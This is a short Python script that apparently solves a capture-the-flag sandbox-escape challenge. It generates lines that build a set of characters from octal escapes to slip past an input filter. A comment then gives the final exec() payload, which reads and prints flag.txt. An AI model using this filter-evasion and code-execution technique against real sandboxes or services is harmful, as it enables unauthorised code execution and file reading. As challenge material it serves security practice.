#list of octals to create strings to add into the set
octs = [164, 151, 156, 162, 160, 154, 163, 167, 150, 157, 147, 170]
#create payload strings: formatted like "abcdef.add('\147')"
add_oct_1 = "abcdef.add(\'\\" 
add_oct_2 = "\')"
for x in octs:
    print(add_oct_1 + str(x) + add_oct_2)

#after pasting all of that, paste in actual payload:
    #exec("with open(\"flag.txt\", \'r\') as a: print(a.readlines())") 